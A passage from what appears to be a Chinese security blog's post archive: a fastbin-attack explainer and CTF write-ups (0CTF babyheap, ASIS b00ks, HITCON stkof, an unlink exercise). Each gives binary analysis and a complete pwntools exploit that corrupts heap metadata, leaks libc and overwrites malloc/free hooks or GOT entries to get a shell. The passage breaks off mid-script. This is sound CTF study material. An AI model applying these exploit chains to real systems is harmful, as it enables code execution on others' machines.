bin中chunk的fd指针的值，那么在取出这个chunk后，fd指针指向的内存将会作为下一个将要被取出的内存，再次申请这个大小的内存，也就实现了在任意地方分配chunk的目的。但是这里需要绕过一个检查:12345678910111213// 存在可以利用的chunkif (victim != 0) &#123; // 检查取到的 chunk 大小是否与相应的 fastbin 索引一致。 // 根据取得的 victim ，利用 chunksize 计算其大小。 // 利用fastbin_index 计算 chunk 的索引。 if (__builtin_expect(fastbin_index(chunksize(victim)) != idx, 0)) &#123; errstr = "malloc(): memory corruption (fast)"; errout: malloc_printerr(check_action, errstr, chunk2mem(victim), av); return NULL; &#125; ...&#125;malloc会检查取到的chunk的size是否是符合这个fast bin的，若是不符合则会GG。所以想要在任意地方分配一个chunk，需要先想办法在此处构造合适的size来通过这个检查。巧妙的是，因为此处没有对内存进行对齐检查，所以可以通过错位的方式来构造出一个假的size出来（详见文末相关题目）利用前提存在堆溢出、UAF等可以控制堆块内容（fd指针）的漏洞漏洞发生于fast chunk可以在目标位置构造出合适的size来绕过检查利用过程在想要分配的目标内存附近找到或者利用错位构造一个合适的size，用于绕过检查释放掉victim（fast chunk）通过从上一个chunk溢出或UAf等方式修改victim的fd指针，使fd指针指向构造好size的目标chunk通过两次分配，得到目标chunk题目0CTF 2017 babyheap]]></content>
      <categories>
        <category>堆利用学习</category>
      </categories>
      <tags>
        <tag>堆利用</tag>
        <tag>fastbin_attack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[0ctf2017-babyheap writeup]]></title>
    <url>%2Fpost%2F47331c36.html</url>
    <content type="text"><![CDATA[题目描述题目来源：0CTF 2017知识点：fastbin attack，chunk overlap题目是一个内存管理系统，能增删查改。1234567===== Baby Heap in 2017 =====1. Allocate2. Fill3. Free4. Dump5. ExitCommand:题目是64位程序，开启保护情况：123456[*] &apos;/home/nick/pwn_learn/heapLearn/fastbinAtk/0ctf2017_babyheap/0ctfbabyheap&apos; Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled程序概况Allocate函数：12345678910111213141516171819202122232425262728void __fastcall Allocate(__int64 a1)&#123; signed int i; // [rsp+10h] [rbp-10h] signed int v2; // [rsp+14h] [rbp-Ch] void *v3; // [rsp+18h] [rbp-8h] for ( i = 0; i &lt;= 15; ++i ) &#123; if ( !*(_DWORD *)(24LL * i + a1) ) &#123; printf("Size: "); v2 = get_num(); if ( v2 &gt; 0 ) &#123; if ( v2 &gt; 4096 ) v2 = 4096; v3 = calloc(v2, 1uLL); if ( !v3 ) exit(-1); *(_DWORD *)(24LL * i + a1) = 1; *(_QWORD *)(a1 + 24LL * i + 8) = v2; *(_QWORD *)(a1 + 24LL * i + 16) = v3; printf("Allocate Index %d\n", (unsigned int)i); &#125; return; &#125; &#125;&#125;限制chunk最大为4096，使用calloc意味着分配时会将chunk中的内容清0。最后将数据存入结构体1234500000000 chunk struc ; (sizeof=0x18, mappedto_6)00000000 inuse dq ?00000008 length dq ?00000010 ptr dq ?00000018 chunk endsFill函数：1234567891011121314151617181920212223242526__int64 __fastcall Fill(__int64 a1)&#123; __int64 result; // rax int v2; // [rsp+18h] [rbp-8h] int v3; // [rsp+1Ch] [rbp-4h] printf("Index: "); result = get_num(); v2 = result; if ( (signed int)result &gt;= 0 &amp;&amp; (signed int)result &lt;= 15 ) &#123; result = *(unsigned int *)(24LL * (signed int)result + a1); if ( (_DWORD)result == 1 ) &#123; printf("Size: "); result = get_num(); v3 = result; if ( (signed int)result &gt; 0 ) &#123; printf("Content: "); result = sub_11B2(*(_QWORD *)(24LL * v2 + a1 + 16), v3); &#125; &#125; &#125; return result;&#125;发现此处没有对size进行限制，存在溢出。并且，sub_11B2这个读取字符串的函数没有在字符串末尾加上&#39;\x00&#39;Free函数中将堆块释放，并将指针清0，没有什么问题。dump函数将指定索引的堆块内容输出漏洞分析泄露libc基址（chunk overlap）因为在small bin中只有一个chunk时，这个chunk的fd和bk将指向libc中某个地址（&amp;main_arena+88）,所以只要能够输出fd或者bk，就能泄露出libc的基址。123456780x555555757000 PREV_INUSE &#123; prev_size = 0, size = 209, fd = 0x7ffff7dd37b8 &lt;main_arena+88&gt;, &lt;== libc中的地址 bk = 0x7ffff7dd37b8 &lt;main_arena+88&gt;, fd_nextsize = 0x0, bk_nextsize = 0x0&#125;问题的关键转移到如何输出fd和bk。因为存在堆溢出，那么可以通过从chunk0溢出到chunk1，修改chunk1的size，使size变大从而造成overlap，让chunk2的头部包含在chunk1中，然后就可以通过打印chunk1来泄露libc了fastbin attack先将chunk1释放，通过从chunk0溢出到chunk1的fd，通过控制chunk1的fd，则可以在几乎任意地方分配chunk。因为程序开启PIE和RELRO，所以没办法利用got表，则考虑malloc_hook或者free_hook等。这里需要考虑一个问题，在从fast bin分配chunk时，会检查取到的chunk大小是否与相应的fastbin索引一致（源码如下），也就是说若要在某个地方分配chunk，需要先在这个地方构造好size，使这个size恰好属于chunk所在的fastbin。1234567891011 // 存在可以利用的chunkif (victim != 0) &#123; // 检查取到的 chunk 大小是否与相应的 fastbin 索引一致。 // 根据取得的 victim ，利用 chunksize 计算其大小。 // 利用fastbin_index 计算 chunk 的索引。 if (__builtin_expect(fastbin_index(chunksize(victim)) != idx, 0)) &#123; errstr = "malloc(): memory corruption (fast)"; errout: malloc_printerr(check_action, errstr, chunk2mem(victim), av); return NULL; &#125;巧妙的是，在malloc_hook的前面，有类似这样的数据:1230x7ffff7dd3720 &lt;__memalign_hook&gt;: 0x00007ffff7a94fc0 0x00000000000000000x7ffff7dd3730 &lt;__realloc_hook&gt;: 0x00007ffff7a94f60 0x00000000000000000x7ffff7dd3740 &lt;__malloc_hook&gt;: 0x00007ffff7a94f20 0x0000000000000000又因为这里并没有对齐检测，所以可以通过利用没有对齐的数据来通过检测。通过截取上面数据的7f，和后面的00拼在一起，变成:1230x7ffff7dd371d: 0xfff7a94fc0000000 0x000000000000007f0x7ffff7dd372d: 0xfff7a94f60000000 0x000000000000007f0x7ffff7dd373d: 0xfff7a94f20000000 0x000000000000007f这样就构造出了一个size为0x7f的chunk。这样就可以在这分配一个大小为0x7f的chunk，然后从这写入，覆盖一定的无效数据就能到达malloc_hook的地址，然后向malloc_hook中写入one_gadget就可以getshell了。（了解one_gadget）漏洞利用分配两个chunk,大小分别为0x60和0x40（第二个chunk较小是为了之后能够改大，而又不超过fastbin限制）从chunk0溢出到chunk1的size，将其改成0x70，使chunk1覆盖的范围变大。但此时还并没有真正变大，要释放后重新分配出来才能生效。再分配两个chunk，chunk2需要是small chunk，chunk3是用来隔开top chunk，防止释放chunk2时被top chunk合并。因为在free的时候会检查下一个chunk的size是否大于2*size_sz并且小于system_mem（源码如下），所以还要在chunk2中构造一个fake size12345678910// 下一个chunk的大小nextsize = chunksize(nextchunk);// next chunk size valid check// 判断下一个chunk的大小是否不大于2*SIZE_SZ，或者// nextsize是否大于系统可提供的内存if (__builtin_expect(chunksize_nomask(nextchunk) &lt;= 2 * SIZE_SZ, 0) || __builtin_expect(nextsize &gt;= av-&gt;system_mem, 0)) &#123; errstr = "free(): invalid next size (normal)"; goto errout;&#125;将chunk1释放，并重新分配一个大小0x60的chunk，这里chunk1被取回并成功扩大。因为使用的calloc会初始化内存，所以还需要恢复一下chunk2的前20个字节释放chunk2，chunk2进入small bin打印chunk1，泄露出libc的基址通过libc基址计算出malloc_hook的地址和one_gadget的地址释放掉chunk1，通过溢出chunk0来修改chunk1的fd，将fd修改到malloc_hook附近通过两次分配，得到malloc_hook附近的chunk向malloc_hook中写入one_gadget，成功getshellexp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105#-*- coding:utf-8 -*-from pwn import *p = process('./0ctfbabyheap')context.terminal = ['gnome-terminal', '-x', 'sh', '-c']libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def Allocate(size): p.recvuntil('Command: ') p.sendline('1') p.recvuntil('Size: ') p.sendline(str(size))def Fill(index, content): p.recvuntil('Command: ') p.sendline('2') p.recvuntil('Index: ') p.sendline(str(index)) p.recvuntil('Size: ') p.sendline(str(len(content) + 1)) p.recvuntil('Content: ') p.sendline(content)def Free(index): p.recvuntil('Command: ') p.sendline('3') p.recvuntil('Index: ') p.sendline(str(index))def Dump(index): p.recvuntil('Command: ') p.sendline('4') p.recvuntil('Index: ') p.sendline(str(index)) p.recvuntil('Content: \n') data = p.recvline() return datadef leak_libc(): Allocate(0x60) #0 Allocate(0x40) #1 #从chunk0溢出，将chunk1的size改为0x71，使chunk1覆盖范围更大 payload = 'a'*0x60 + p64(0) + p64(0x71) Fill(0, payload) #分配一个0x100的smallchunk 再分配一个chunk是为了防止free smallchunk时被topchunk合并 #该smallchunk的chunkhead(0x10个字节)和fd、bk(0x10个字节)都在修改后的chunk1的数据区 #接下来要将chunk1释放掉再分配使chunk1范围真正扩大 #但释放时会检查下一个chunk的size是否大于2*size_sz且小于system_mem #所以还得构造一下next size Allocate(0x100) #2 Allocate(0x60) #3 payload = 'a'*0x10 + p64(0) + p64(0x71) Fill(2, payload) #释放chunk1并重新分配回来，因为alloc会初始化内存，所以smallchunk的前0x20个字节被清空 #恢复smallchunk的前0x20个字节 Free(1) Allocate(0x60) #1 payload = 'a'*0x40 + p64(0) + p64(0x111) Fill(1, payload) #释放smallchunk 因为当smallbin是一个双向链表 所以当其中只有一个chunk时 #该chunk的fd和bk都指向头结点 头结点存在于main_arena中 main_arena又存在于libc中 #所以fd和bk指向的是libc中的某个地址 通过固定的偏移 则可以泄露出libc_base Free(2) leaked = u64(Dump(1)[-9:-1]) - 0x3C27B8 print "libc_base : %#x" % (leaked) return leakeddef fastbin_attack(libc_base): #malloc_hook 可以在gdb中 x/32gx (long long)(&amp;main_arena)-0x40 来找到 malloc_hook = libc_base + libc.symbols['__malloc_hook'] #使用 one_gadget 找到execve('/bin/sh') execve_addr = libc_base + 0x4647c print "malloc_hook : %#x" % malloc_hook print "execve_addr : %#x" % execve_addr #释放掉chunk1 通过溢出chunk0来修改chunk1的fd #通过控制chunk1的fd 则可以在任何地方分配内存 那么我们可以控制malloc_hook #因为malloc会检查fastbin中chunk的size是否属于这个fastbin #而malloc_hook处的值为0 不能通过检查 #通过前文提到的未对齐的数据来绕过检查 #这样就可以获得一个size位为0x7f的chunk Free(1) payload = 'a'*0x60 + p64(0) + p64(0x71) + p64(malloc_hook - 19) + p64(0) Fill(0, payload) #通过两次分配 得到malloc_hook附近的chunk Allocate(0x60) Allocate(0x60) #覆盖一定的无效数据到达malloc_hook的地址 向其中写入execve_addr payload = p8(0)*3 + p64(execve_addr) Fill(2, payload) #malloc时判断malloc_hook不为0 执行malloc_hook指向的代码 getshell Allocate(0x60)libc_base = leak_libc()fastbin_attack(libc_base)p.interactive()相关链接题目链接：0ctf_babyheapwriteup参考：Anciety师傅的博客]]></content>
      <categories>
        <category>writeups</category>
      </categories>
      <tags>
        <tag>堆利用</tag>
        <tag>writeup</tag>
        <tag>how2heap</tag>
        <tag>fastbin_attack</tag>
        <tag>ctfwiki</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Asis2016-b00ks writeup]]></title>
    <url>%2Fpost%2Fb6745c59.html</url>
    <content type="text"><![CDATA[题目描述题目来源：Asis CTF 2016知识点：null byte off_by_one、mmap泄露libc基址题目是一个书籍管理系统，具有增删查改功能。1234567891011nick@nick-machine:~/pwn_learn/heapLearn/off_by_one$ ./b00ks Welcome to ASISCTF book libraryEnter author name: aaaa1. Create a book2. Delete a book3. Edit a book4. Print book detail5. Change current author name6. Exit&gt;题目是64位程序，开启保护情况：123456[*] &apos;/lib/x86_64-linux-gnu/libc.so.6&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled程序开启了PIE，意味着难以得到程序中函数的地址，可能对泄露libc造成阻碍。程序概况程序首先要求输入author name，调用一个处理输入的函数（input函数）123456789101112131415161718192021signed __int64 __fastcall input(_BYTE *a1, int a2)&#123; int i; // [rsp+14h] [rbp-Ch] _BYTE *buf; // [rsp+18h] [rbp-8h] if ( a2 &lt;= 0 ) return 0LL; buf = a1; for ( i = 0; ; ++i ) &#123; if ( read(0, buf, 1uLL) != 1 ) return 1LL; if ( *buf == '\n' ) break; ++buf; if ( i == a2 ) break; &#125; *buf = 0; return 0LL;&#125;分析代码可以发现，代码对字符串末尾处理不当，会在字符串的最后加上&#39;\x00&#39;,即使字符串已经占满buf。也就是说程序中存在null byte off_by_one漏洞create函数:输入name，对大小没有限制1234567printf("\nEnter book name size: ", *&amp;v1); __isoc99_scanf("%d", &amp;v1); if ( v1 &gt;= 0 ) &#123; printf("Enter book name (Max 32 chars): ", &amp;v1); ptr = malloc(v1); ...输入description，同样对大小无限制12345678910111213printf("\nEnter book description size: ", *&amp;v1);__isoc99_scanf("%d", &amp;v1);if ( v1 &gt;= 0 )&#123; v5 = malloc(v1); if ( v5 ) &#123; printf("Enter book description: ", &amp;v1); if ( input(v5, v1 - 1) ) &#123; printf("Unable to read description"); &#125; ...最后将name和description的指针存入结构体12345678910v3 = malloc(0x20uLL);if ( v3 )&#123; *(v3 + 6) = v1; *(off_202010 + v2) = v3; *(v3 + 2) = v5; *(v3 + 1) = ptr; *v3 = ++cnt; return 0LL;&#125;分析可得到结构体12345600000000 book struc ; (sizeof=0x20, mappedto_6)00000000 index dq ?00000008 name dq ?00000010 description dq ?00000018 size dq ?00000020 book endsdelete函数会将指针清零，不存在悬挂指针edit函数用于编辑book的descriptionprint函数输出ID、name、description、author，可以用来泄露信息change_name函数可以修改author name漏洞分析任意读写由于null byte off_by_one，在程序开头时，若输入32位的author name（unk_202040），那么&#39;\x00&#39;会溢出到book_list（unk_202060）中1234.data:0000000000202010 book_list dq offset unk_202060 ; DATA XREF: sub_B24:loc_B38↑o.data:0000000000202010 ; delete:loc_C1B↑o ....data:0000000000202018 author_name dq offset unk_202040 ; DATA XREF: change_name+15↑o.data:0000000000202018 ; print+CA↑o若是此时create一个book，那么新book的指针将会覆盖掉这个溢出的&#39;\x00&#39;，导致author name与book指针之间没有截断，意味着我可以通过输出author name来泄露出book的指针，也就是堆地址。1230x555555756040: 0x6161616161616161 0x6161616161616161 &lt;== author name0x555555756050: 0x6161616161616161 0x00616161616161610x555555756060: 0x0000555555757160 &lt;== book指针由于程序提供修改author name的函数，所以可以再次输入32位的author name，使溢出的&#39;\x00&#39;覆盖掉book指针的最低字节，导致book的指针所指向的地址变小。10x0000555555757160 ==&gt; 0x0000555555757100 //地址变小因为在create一个book时，会先申请name和description的空间，所以经过修改的book指针有可能就会指向地址偏小description的空间中1234567891011120x555555757000: 0x0000000000000000 0x0000000000000021 &lt;== name0x555555757010: 0x6161616161616161 0x00000000000000000x555555757020: 0x0000000000000000 0x0000000000000131 &lt;== description0x555555757030: 0x6262626262626262 0x00000000000000000x555555757040: 0x0000000000000000 0x0000000000000000 ......0x555555757100: 0x0000000000000000 0x0000000000000000 &lt;== 修改后的book指针，指向description中 ...... 0x555555757150: 0x0000000000000000 0x00000000000000310x555555757160: 0x0000000000000001 0x0000555555757010 &lt;== 修改前的book指针0x555555757170: 0x0000555555757030 0x00000000000001200x555555757180: 0x0000000000000000 0x0000000000020e81所以可以事先在description中伪造一个book结构体，当book指针被修改于此时，就可以对伪造的name和description进行读写，实现任意读写。泄露libc基址这道题由于开启PIE，并且没有uaf等常规方法来泄露libc，所以这里采用了一种更为巧妙的方法。在分配第二个book时，申请一个很大的空间，使堆以mmap模式进行拓展（可以参考这里）。因为mmap分配的内存与libc之前存在固定的偏移因此可以推算出libc的基地址123456789101112131415161718192021pwndbg&gt; vmmapLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA 0x56052bb62000 0x56052bb64000 r-xp 2000 0 /home/nick/pwn_learn/heapLearn/off_by_one/b00ks 0x56052bd63000 0x56052bd64000 r--p 1000 1000 /home/nick/pwn_learn/heapLearn/off_by_one/b00ks 0x56052bd64000 0x56052bd65000 rw-p 1000 2000 /home/nick/pwn_learn/heapLearn/off_by_one/b00ks 0x56052d944000 0x56052d965000 rw-p 21000 0 [heap] 0x7fd6affa0000 0x7fd6b015e000 r-xp 1be000 0 /lib/x86_64-linux-gnu/libc-2.19.so 0x7fd6b015e000 0x7fd6b035e000 ---p 200000 1be000 /lib/x86_64-linux-gnu/libc-2.19.so 0x7fd6b035e000 0x7fd6b0362000 r--p 4000 1be000 /lib/x86_64-linux-gnu/libc-2.19.so 0x7fd6b0362000 0x7fd6b0364000 rw-p 2000 1c2000 /lib/x86_64-linux-gnu/libc-2.19.so 0x7fd6b0364000 0x7fd6b0369000 rw-p 5000 0 0x7fd6b0369000 0x7fd6b038c000 r-xp 23000 0 /lib/x86_64-linux-gnu/ld-2.19.so 0x7fd6b054d000 0x7fd6b0572000 rw-p 25000 0 &lt;==== mmap分配的空间 0x7fd6b058a000 0x7fd6b058b000 rw-p 1000 0 0x7fd6b058b000 0x7fd6b058c000 r--p 1000 22000 /lib/x86_64-linux-gnu/ld-2.19.so 0x7fd6b058c000 0x7fd6b058d000 rw-p 1000 23000 /lib/x86_64-linux-gnu/ld-2.19.so 0x7fd6b058d000 0x7fd6b058e000 rw-p 1000 0 0x7ffe6b361000 0x7ffe6b382000 rw-p 21000 0 [stack] 0x7ffe6b3bd000 0x7ffe6b3bf000 r--p 2000 0 [vvar] 0x7ffe6b3bf000 0x7ffe6b3c1000 r-xp 2000 0 [vdso]0xffffffffff600000 0xffffffffff601000 r-xp 1000 0 [vsyscall]getshell因为PIE，所以很难采用覆写got表等方法。而已经泄露了libc，所以这里采用向__free_hook写入system来getshell漏洞利用输入32位的author name，create一个book1（name：0x20字节，description：0x120字节）调用show函数 泄露堆地址create book2（description为大空间：0x21000字节），准备泄露libc基址create book3（name写入&#39;/bin/sh\x00&#39;）为getshell做准备在book1-&gt;description中伪造book结构体，name指针为book2的description指针（即mmap分配空间的地址），description指针为book3中description指针的地址。（这里地址都可以由泄露的堆地址加上偏移得到）重新向author name中写入32个字节，使&#39;\x00&#39;覆盖掉book1指针的最低位字节，book1指针指向book1-&gt;description中布置好的book结构体调用show函数，通过book1的name的值得到mmap分配的地址，减去固定的偏移获得libc基址通过libc基址，计算出system和__free_hook的地址调用edit，修改book1的description，写入free_hook的地址，因为第（5）步，所以这里实际是将book3的description指针改为free_hook的地址调用edit，修改book3的description，写入system，因为第（9）步，所以这里实际是把system写入__free_hook中调用delete(book3)，因为事先在name写入的&#39;/bin/sh\x00&#39;，所以成功getshell我的exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586#-*- coding=utf-8 -*-from pwn import *context.log_level = 'debug'p = process('b00ks')context.terminal = ['gnome-terminal', '-x', 'sh', '-c']libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def create(name, description): p.recvuntil('&gt; ') p.sendline('1') p.recvuntil('Enter book name size: ') p.sendline(str(len(name))) p.recvuntil('Enter book name (Max 32 chars): ') p.send(name) p.recvuntil('Enter book description size: ') p.sendline(str(len(description))) p.recvuntil('Enter book description: ') p.send(description)def delete(index): p.recvuntil('&gt; ') p.sendline('2') p.recvuntil('id you want to delete: ') p.sendline(str(index))def edit(index, description): p.recvuntil('&gt; ') p.sendline('3') p.recvuntil('id you want to edit: ') p.sendline(str(index)) p.recvuntil('new book description: ') p.sendline(description)def show(): p.recvuntil('&gt; ') p.sendline('4')def change_name(name): p.recvuntil('&gt; ') p.sendline('5') p.recvuntil('Enter author name: ') p.sendline(name)def leak(addr1, addr2): payload = 'b'*0xc0 + p64(1) + p64(addr1) + p64(addr2) + p64(0x120) edit(1, payload) change_name('a'*32) show() p.recvuntil('Name: ') res = u64(p.recvuntil('\n')[:-1].ljust(8, '\x00')) return res#泄露堆地址p.recvuntil('Enter author name: ')p.sendline('a'*32)create('a'*0x20, 'b'*0x120)show()p.recvuntil('Author: ')heap_addr = u64(p.recvuntil('\n')[32:-1].ljust(8, '\x00'))print "heap_addr: %#x" % heap_addr#申请一个大内存，让堆以mmap模式进行拓展，进而泄露libc_basecreate('a'*0x20, '\x00'*0x21000)create('/bin/sh\x00', 'b'*0x8)#heap_addr+0x70是以mmap拓展的堆的地址，将他写入伪造的book结构体的name中，准备泄露该值#heap_addr_0xe0是chunk3的description指针，为之后任意写做准备libc_base = leak(heap_addr+0x70, heap_addr+0xe0) - 0x5AD010 #该值需要根据系统修改print "libc_base: %#x" % libc_base#计算地址system = libc_base + libc.symbols['system']free_hook = libc_base + libc.symbols['__free_hook']print "system: %#x" % systemprint "free_hook: %#x" % free_hook#之前将chunk3的description指针的地址写到了伪造chunk的description指针处，所以这里将改写chunk3的description指针的值为free_hook#因为off_one_byte会导致写入时会多往后覆盖一个字节，导致后方的book-&gt;size被覆盖为0，所以这里手动多写一个字节'\x08'，以免size被覆盖为0edit(1, p64(free_hook)+'\x08')#向free_hook中写入systemedit(3, p64(system))#事先已经在chunk3的name中放入了/bin/sh\x00delete(3)p.interactive()相关链接题目链接：b00ks]]></content>
      <categories>
        <category>writeups</category>
      </categories>
      <tags>
        <tag>堆利用</tag>
        <tag>writeup</tag>
        <tag>ctfwiki</tag>
        <tag>off_by_one</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hitcon2014-stkof writeup]]></title>
    <url>%2Fpost%2Fe7616071.html</url>
    <content type="text"><![CDATA[题目描述题目来源：HITCON CTF 2014知识点：unlink这道题没有菜单显示，只能通过分析代码来了解程序功能。功能：添加（输入：长度）修改（输入：索引、长度、内容）删除（输入：索引）程序保护情况：123456[*] &apos;/home/nick/pwn_learn/heapLearn/unlink/hitcon2014_stkof/stkof&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE程序分析add函数中，对分配chunk的大小没有限制，将指针存到全局数组中，可获得指针变量的地址set函数中，12345678910111213141516171819202122232425262728293031signed __int64 set()&#123; signed __int64 result; // rax int i; // eax unsigned int v2; // [rsp+8h] [rbp-88h] __int64 n; // [rsp+10h] [rbp-80h] char *ptr; // [rsp+18h] [rbp-78h] char s; // [rsp+20h] [rbp-70h] unsigned __int64 v6; // [rsp+88h] [rbp-8h] v6 = __readfsqword(0x28u); fgets(&amp;s, 16, stdin); v2 = atol(&amp;s); if ( v2 &gt; 0x100000 ) return 0xFFFFFFFFLL; if ( !::s[v2] ) return 0xFFFFFFFFLL; fgets(&amp;s, 16, stdin); n = atoll(&amp;s); ptr = ::s[v2]; for ( i = fread(ptr, 1uLL, n, stdin); i &gt; 0; i = fread(ptr, 1uLL, n, stdin) ) &#123; ptr += i; n -= i; &#125; if ( n ) result = 0xFFFFFFFFLL; else result = 0LL; return result;&#125;对写入的长度没有限制，存在堆溢出，所以可以利用unlink漏洞delete函数中，释放掉堆块并把指针清零0由于程序中没有可以用来输出数据的函数，于是考虑将puts函数覆写到其他函数的got表（这里选择free函数）漏洞利用分配连续4个chunk（编号1-4），大小为0x80（smallchunk）（通常尽量多申请一个chunk，以隔开top chunk，防止被合并）在chunk1中构造fake chunk，准备unlinkprevsize：0size：0x80fd：chunk_ptr - 0x18bk：chunk_ptr - 0x10注意：chunk_ptr是指向chunk0的指针变量所在的地址，而非指针指向的地址从chunk1继续溢出到chunk2，修改prevsize、size（inuse位）prevsize: 0x80size：0x90释放chunk2，触发unlink，此后chunk1的指针的值被修改为了chunk_ptr-0x18把free的got表修改为puts。payload = p64(0)*3 + p64(chunk_ptr-0x18) + p64(free_got)set(1, payload)set(2, p64(puts))使用DynELF泄露system（详见代码）利用（5）的方法，再将free的got表修改为system向chunk3中写入/bin/sh\x00，释放chunk3，getshell我的exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071from pwn import *context.log_level = 'debug'context.terminal = ['gnome-terminal', '-x', 'sh', '-c']p = process('./stkof')elf = ELF('./stkof')free_got = elf.got['free']puts = elf.symbols['puts']def add(size): p.sendline('1') p.sendline(str(size)) p.recvuntil('OK\n')def set(index, content): p.sendline('2') p.sendline(str(index)) p.sendline(str(len(content))) p.send(content) p.recvuntil('\n')def delete(index): p.sendline('3') p.sendline(str(index))def leak(addr): payload = p64(0)*3 + p64(chunk_ptr-0x18) + p64(addr) set(1, payload) delete(2) res = p.recvuntil('OK\n').split('\x0aOK')[0] if res == '': res = '\x00' return res #返回值可以为任意长度，并不清楚原因chunk_ptr = 0x602148add(0x80)add(0x80)add(0x80)add(0x80)#unlinkpayload = p64(0) + p64(0x0)payload += p64(chunk_ptr-0x18) + p64(chunk_ptr-0x10)payload += 'a' * 0x60payload += p64(0x80) + p64(0x90)set(1, payload)delete(2)p.recvuntil('OK\n')#freegot写为putspayload = p64(0)*3 + p64(chunk_ptr-0x18) + p64(free_got)set(1, payload)set(2, p64(puts))#leakd = DynELF(leak, elf = elf)system = d.lookup('system', 'libc')print "system addr: %#x" % system#freegot写为systempayload = p64(0)*3 + p64(chunk_ptr-0x18) + p64(free_got)set(1, payload)set(2, p64(system))#getshellset(3, '/bin/sh\x00')delete(3)p.interactive()相关链接题目链接：stkof相关题目：unlink例题unlink漏洞分析：堆利用学习之unlink]]></content>
      <categories>
        <category>writeups</category>
      </categories>
      <tags>
        <tag>unlink</tag>
        <tag>堆利用</tag>
        <tag>writeup</tag>
        <tag>how2heap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[unlink例题]]></title>
    <url>%2Fpost%2F503970b4.html</url>
    <content type="text"><![CDATA[题目描述先运行该程序，发现是一道典型的菜单题，有增删查改功能。知识点：unlink123456nick@nick-machine:~/pwn_learn/heapLearn/unlink/t1$ ./heap1.Add chunk2.Set chunk3.Delete chunk4.Print chunk5.Exit程序分析其中，add函数没有对申请的chunk大小做限制。在set函数中：123456789101112ssize_t set()&#123; int v1; // [esp+Ch] [ebp-Ch] v1 = -1; write(1, "Set chunk index:", 0x10u); __isoc99_scanf("%d", &amp;v1); if ( v1 &lt; 0 ) return write(1, "Set chunk data error!\n", 0x16u); write(1, "Set chunk data:", 15u); return read(0, buf[v1], 0x400u);&#125;可以发现代码中没有对写入的长度做限制，存在溢出同时，buf[]中储存指向chunk的指针，且为全局变量，可以获得地址由此确定程序中存在unlink漏洞在delete函数中：123456789101112void delete()&#123; int v0; // [esp+Ch] [ebp-Ch] v0 = -1; write(1, "Delete chunk index:", 0x13u); __isoc99_scanf("%d", &amp;v0); if ( v0 &gt;= 0 ) free(buf[v0]); else write(1, "Delete chunk error!\n", 0x14u);&#125;释放chunk后没有对指针赋0，会造成UAF漏洞，但此题不会利用到。在print函数中，可输出任意index的chunk，用于泄露数据。由于题目没有给出libc，所以需要用到DynELF来泄露system函数，可以利用unlink后修改chunk指针来实现任意读漏洞利用分配3个连续的chunk，大小为0x80（smallchunk）chunk0、chunk1: 用于构造unlinkchunk2：用于防止被top chunk合并在chunk0中构造fake chunk，准备unlink。prevsize：0size：0x80fd：chunk_ptr - 0xcbk：chunk_ptr - 0x8注意：chunk_ptr是指向chunk0的指针变量所在的地址，即&amp;buf[0]，而非指针指向的地址从chunk0继续溢出到chunk1，修改prevsize、size（inuse位）prevsize: 0x80size：0x88释放chunk1，触发unlink，此后buf[0]，即chunk0的指针的值被修改为了chunk_ptr-0xc写入chunk0，构造leak函数，准备利用DynELF来泄露system，由于指针被修改，实际写入地址是chunk_ptr-0xc。payload = &#39;a&#39; * 0xc //paddingpayload += p32(chunk_ptr-0xc) //保留chunk0的指针，以便重复利用payload += p32(addr) //将addr写入chunk1的指针(buf[1])此后输出chunk1即为输出地址addr的值，实现可重复利用的任意地址读取利用DynELF泄露出system函数地址利用（5）的payload，将addr设为free_got，再向chunk1中写入system的地址。因为chunk1的指针被覆盖为free_got，所以会将system的地址写入free的got表向chunk2中写入&#39;/bin/sh\x00&#39;，调用free(chunk2)，因为free被覆盖为system，所以实际调用system(chunk2)，成功getshell我的exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374from pwn import *elf = ELF('heap')free_got = elf.got['free']chunk_ptr = 0x8049d60#p = process('heap')p = remote('127.0.0.1', 4000)def add_chunk(size): p.recvuntil('5.Exit\n') p.sendline('1') p.recvuntil('Input the size of chunk you want to add:') p.sendline(str(size))def set_chunk(index, data): p.recvuntil('5.Exit\n') p.sendline('2') p.recvuntil('Set chunk index:') p.sendline(str(index)) p.recvuntil('Set chunk data:') p.send(data)def delete_chunk(index): p.recvuntil('5.Exit\n') p.sendline('3') p.recvuntil('Delete chunk index:') p.sendline(str(index))def print_chunk(index): p.recvuntil('5.Exit\n') p.sendline('4') p.recvuntil('Print chunk index:') p.sendline(str(index)) return p.recvline()def leak(addr): payload = 'a' * 0xc + p32(chunk_ptr-0xc) + p32(addr) set_chunk(0, payload) res = print_chunk(1)[:4] print "leaking: %#x ---&gt; %s" % (addr, res.encode('hex')) return res add_chunk(128)add_chunk(128)add_chunk(128)set_chunk(2, '/bin/sh\x00')#在第一个chunk的数据区域构造一个假chunk，size为0x80，并设置fd、bkpayload = p32(0) + p32(0x80) + p32(chunk_ptr-0xc) + p32(chunk_ptr-0x8)#从第一个chunk写入数据覆盖到第二个chunk，讲第二个chunk的prev_size设为0x80，并将size的in_use标志置0payload += 'a' * (0x80-0x10) + p32(0x80) + p32(0x88)set_chunk(0, payload)#free第二个chunk，将会触发unlinkdelete_chunk(1)#泄露system的地址d = DynELF(leak, elf = elf)system = d.lookup('system', 'libc')print "system addr: %#x" % system#将free_got的地址覆盖掉第二个chunk的地址payload = 'a' * 0xc + p32(chunk_ptr-0xc) + p32(free_got)set_chunk(0, payload)#修改第二个chunk，由于地址被覆盖，实际修改的是free的got表，将其修改为system的地址set_chunk(1, 